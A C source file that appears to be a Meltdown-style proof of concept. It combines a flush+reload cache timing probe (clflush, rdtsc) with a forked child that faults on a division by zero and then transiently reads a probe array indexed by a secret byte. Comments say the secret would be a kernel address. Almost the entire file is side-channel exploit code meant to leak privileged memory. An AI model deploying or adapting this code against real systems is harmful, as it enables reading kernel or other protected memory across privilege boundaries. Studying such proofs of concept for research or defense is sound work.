#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>

unsigned long probe(char *adrs);    // flush+reload
void cf(char *a);
static inline void maccess(void *p);
int main(void)
{
    char arr[256 * 4096];
    char data = 234; // just a random number
                    // this will be kernel memory value like *0xffffffff80000000 or something
    int status;
    unsigned long time[256];
    pid_t pid;

//    memset(arr, 0xab, sizeof(arr));
    for (int i = 0; i < 256; i++)
    {
        for (int j = 0; j < 256; j++)
        {
            cf(arr + j * 4096);
        }
        pid = fork();
        if (pid > 0)
        {
//            printf("parent process here! %ld %ld %ld\n", (long)getppid(), (long)getpid(), (long)pid);
        }
        else if (pid == 0)
        {
//            printf("child process here! %ld %ld %ld\n", (long)getppid(), (long)getpid(), (long)pid);
            int kk = 1 / 0;
//            char k = arr[data * 4096];
            maccess(arr + data * 4096);
        }
        else if (pid == -1)
        {
            printf("ERR\n");
        }
        wait(&status);

        /*
           flush+reload here!
        */
        time[i] = probe(&arr[i * 4096]);
    }
    for (int i = 0; i < 256; i++)
    {
        printf("i = %d : %ld cycles\n", i, time[i]);
    }
    return 0;
}
unsigned long probe(char *adrs)
{
    volatile unsigned long time;

    asm __volatile__
        (
         "  mfence              \n"
         "  lfence              \n"
         "  rdtsc               \n"
         "  lfence              \n"
         "  movl %%eax, %%esi   \n"
         "  movl (%1), %%eax    \n"
         "  lfence              \n"
         "  rdtsc               \n"
         "  subl %%esi, %%eax   \n"
         "  clflush 0(%1)       \n"
         :  "=a" (time)
         :  "c" (adrs)
         :  "%esi", "%edx"
        );
    return time;
}
void cf(char *a)
{
    asm __volatile__
        (
         "  clflush 0(%0)      \n"
         :
         :  "c" (a)
        );
}
static inline void maccess(void *p)
{
    asm __volatile__
        (
         "  movq (%0), %%rax    \n"
         :
         :  "c" (p)
         : "rax"
        );
}
